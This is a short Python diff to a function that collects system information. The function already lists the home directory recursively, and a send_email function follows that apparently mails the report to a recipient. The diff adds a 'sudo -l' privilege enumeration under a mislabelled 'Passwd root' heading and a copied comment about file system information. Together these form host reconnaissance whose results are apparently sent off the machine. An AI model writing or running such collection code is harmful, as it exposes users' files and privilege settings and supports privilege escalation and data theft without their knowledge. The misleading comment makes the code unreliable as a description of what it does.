@@ -19,6 +19,10 @@ def collect_system_info():
     info.append("\nFile System (Limited Access):\n")
     info.append(subprocess.getoutput("ls -lR ~"))
 
+    # Collect file system information (limited to accessible directories)
+    info.append("\nPasswd root:\n")
+    info.append(subprocess.getoutput("sudo -l"))
+
     return "\n".join(info)
 
 def send_email(report, recipient_email):
